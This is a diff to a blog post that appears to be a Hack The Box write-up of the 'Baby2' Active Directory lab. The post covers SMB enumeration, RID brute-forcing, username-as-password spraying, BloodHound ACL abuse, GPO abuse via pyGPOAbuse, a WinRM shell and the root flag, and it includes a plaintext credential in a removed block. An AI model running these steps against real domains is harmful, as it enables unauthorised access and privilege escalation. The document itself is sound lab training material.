@@ -8,7 +8,18 @@ tags:
   - blog
   - HTB
   - Port53-DNS-Discovery-Host
-lastmod: 2026-04-30T14:23:37.436Z
+  - Nmap-analyzing
+  - Port139-135-SMB-enumerating-spider
+  - Source-Code-Review-lnk
+  - Port139-135-SMB-rid-brute
+  - Port139-135-SMB-BurteForce
+  - Lateral-Movement-Account-Verify-Nxc
+  - Bloodhound-Setup-Docker-x86
+  - Bloodhound-Vectory-View-All-User
+  - Bloodhound-vectory-loginscript
+  - Bloodhound-vectory-WriteOwner-WriteDacl
+  - Bloodhound-vectory-GenericAll-Group
+lastmod: 2026-05-07T07:19:28.917Z
 ---
 # Box Info
 
@@ -20,7 +31,11 @@ lastmod: 2026-04-30T14:23:37.436Z
 
 ### PORT & IP SCAN
 
-The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `baby2.vl`, and the hostname is `dc`.
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Nmap-analyzing" >}} The target (10.129.234.72) is a Windows Domain Controller for the domain baby2.vl (hostname: dc.baby2.vl). It has a typical full AD exposure with the following ports open: 53 (DNS), 88 (Kerberos), 135/593/52855 (RPC), 139/445 (NetBIOS/SMB), 389/636/3268/3269 (LDAP/LDAPS + Global Catalog), 464 (Kerberos password change), 3389 (RDP), 9389 (.NET Message Framing), and multiple high dynamic RPC ports (49664, 49668, etc.). The system is running Windows Server 2022 (build 10.0.20348) with Active Directory services fully accessible.
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -102,7 +117,7 @@ Nmap done: 1 IP address (1 host up) scanned in 98.95 seconds
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Port53-DNS-Discovery-Host" >}} I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:
+{{< tag "Port53-DNS-Discovery-Host" >}} I’ll use netexec to make a hosts file entry and put it at the top of my `/etc/hosts` file:
 
 {{< /toggle >}}
 
@@ -126,34 +141,11 @@ ff02::2         ip6-allrouters\
 
 ### SMB
 
-login.vbs.lnk
+{{< toggle "Tag 🏷️" >}}
 
-```
-┌──(root㉿kali)-[~/Desktop]
-└─# smbclient //10.129.234.72/apps -N                
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Thu Sep  7 15:12:59 2023
-  ..                                  D        0  Tue Aug 22 16:10:21 2023
-  dev                                 D        0  Thu Sep  7 15:13:50 2023
+{{< tag "Port139-135-SMB-enumerating-spider" >}} I’ll look for files on each share with the `spider_plus` module for `netexec`:
 
-                6126847 blocks of size 4096. 1937855 blocks available
-smb: \> cd dev\
-smb: \dev\> ls
-  .                                   D        0  Thu Sep  7 15:13:50 2023
-  ..                                  D        0  Thu Sep  7 15:12:59 2023
-  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023
-  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023
-
-                6126847 blocks of size 4096. 1937855 blocks available
-smb: \dev\> get login.vbs.lnk
-getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)
-smb: \dev\> 
-```
-
-analyse login.vbs.lnk
-
-used https://github.com/lynnewu/LNKFileAnalyzer
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -235,6 +227,12 @@ getting file \dev\login.vbs.lnk of size 1800 as login.vbs.lnk (2.2 KiloBytes/sec
 smb: \dev\> 
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Source-Code-Review-lnk" >}} I’ll use lnkparse3 (uv tool install lnkparse3) to see details on the lnk file,It links to `login.vbs` in `C:\Windows\SYSVOL\sysvol\baby2.vl\scripts`. `login.vbs` maps the `apps` and `docs` shares as the `V:` and `L:` drivers on a users machine.
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -469,6 +467,12 @@ On its own, **this specific snippet is entirely benign.** There are no reverse s
 
 ### Users
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-rid-brute" >}} This includes all the users with home directories, and more. I’ll use this to make a users list:
+
+{{< /toggle >}}
+
 ```
 ┌──(root㉿kali)-[~/Desktop]
 └─# nxc smb DC.baby2.vl  -u 'guest' -p '' --rid-brute         
@@ -561,6 +565,12 @@ legacy
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-BurteForce" >}} Vulnlabs really likes to showcase password attacks on Windows boxes. One of these is checking for users with their password being their username:
+
+{{< /toggle >}}
+
 ```shell
 ┌──(root㉿kali)-[~/Desktop]
 └─# netexec smb DC.baby2.vl  -u username.txt  -p username.txt --continue-on-success   --no-bruteforce | grep '[+]'
@@ -597,6 +607,12 @@ SMB                      10.129.234.72   445    DC               [+] baby2.vl\:
 library:library  and Carl.Moore:Carl.Moore  is ok
 
 Only the Pwn! is ok to login
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Lateral-Movement-Account-Verify-Nxc" >}} For the winrm , wmi , rdp , need to have the flag of Pwned! which mean to allow to login ; otherwise , it is false positive, but the idap and smb is also normal work.
+
+{{< /toggle >}}
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -674,6 +690,12 @@ LDAP        10.129.234.72   389    DC               Done in 00M 29S
 LDAP        10.129.234.72   389    DC               Compressing output into /root/.nxc/logs/DC_10.129.234.72_2026-04-29_232932_bloodhound.zip
                                                                                                                                                       
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Setup-Docker-x86" >}} Install the Docker which is matched to install docker-bloodhound
+
+{{< /toggle >}}
 
 ### Install the Docker
 
@@ -804,6 +826,12 @@ SMB         10.129.234.72   445    DC               SYSVOL          READ        
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Vectory-View-All-User" >}} Using the cypher to find all users to know who is potential to attack
+
+{{< /toggle >}}
+
 {{< code >}}\
 MATCH (u:User) RETURN u\
 {{< /code >}}
@@ -811,6 +839,12 @@ MATCH (u:User) RETURN u\
 ![Pasted image 20260430133016.png](/ob/Pasted%20image%2020260430133016.png)
 
 ![Pasted image 20260430133312.png](/ob/Pasted%20image%2020260430133312.png)
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-loginscript" >}} I’ve already seen that Amelia.Griffiths uses `login.vbs` as a logon script. Even without seeing that, given the shortcut file pointing at this script on `SYSVOL`, it’s reasonable to make a guess that this script is run on login by users in the domain.
+
+{{< /toggle >}}
 
 i can try to modify the Logonscript due to i have the Preemission
 
@@ -886,6 +920,12 @@ is Amelia.Griffiths to login first , so we can abuse this account
 
 i will quickly add the Amelia.Griffiths is owned
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-WriteOwner-WriteDacl" >}} As a member of the legacy group, Amelia.Griffiths has `WriteOwner` and `WriteDacl` over both the GPOADM group and the GPO-Management OU.
+
+{{< /toggle >}}
+
 ![Pasted image 20260430134620.png](/ob/Pasted%20image%2020260430134620.png)
 
 As a member of the legacy group, Amelia.Griffiths has `WriteOwner` and `WriteDacl` over both the GPOADM group and the GPO-Management OU.
@@ -959,6 +999,12 @@ SMB         10.129.234.72   445    DC               [+] baby2.vl\GPOADM:testest.
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-GenericAll-Group" >}} The GPOADM account has `GenericAll` over two group policy objects (GPOs) , These are marked as high value objects as they give full control over the domain. I need the GPO ID, which BloodHound gives.
+
+{{< /toggle >}}
+
 The GPOADM account has `GenericAll` over two group policy objects (GPOs):
 
 These are marked as high value objects as they give full control over the domain. I need the GPO ID, which BloodHound gives:
@@ -968,6 +1014,8 @@ CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=BABY2,DC=VL
 CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=BABY2,DC=VL
 
 ![Pasted image 20260430140131.png](/ob/Pasted%20image%2020260430140131.png)
+
+I’ll use the [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) tool to get execution from a GPO. I’ll clone it to my host and make sure it has the metadata to run with `uv`:
 
 ```
 ┌──(root㉿kali)-[~/Desktop]
@@ -988,6 +1036,8 @@ Resolving deltas: 100% (95/95), done.
 Resolved 36 packages in 1.65s
 
 ```
+
+I need to feed the script auth for the user who can edit GPOs, the GPO id, and the command to run:
 
 ```
 ┌──(root㉿kali)-[~/Desktop/pyGPOAbuse]
@@ -1033,21 +1083,5 @@ Mode                 LastWriteTime         Length Name
 
 evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
 293500962edc31fa154951eeeb5740f9
-
-```
-
-```
-┌──(root㉿kali)-[~/.nxc/logs]
-└─# smbclient //10.129.234.63/"Departments Share" -U ibryant%Ph4nt0m@5t4rt!
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Sat Jul  6 12:25:31 2024
-  ..                                DHS        0  Thu Aug 14 07:55:49 2025
-  Finance                             D        0  Sat Jul  6 12:25:11 2024
-  HR                                  D        0  Sat Jul  6 12:21:31 2024
-  IT                                  D        0  Thu Jul 11 10:59:02 2024
-
-                6127103 blocks of size 4096. 2382258 blocks available
-smb: \> 
 
 ```
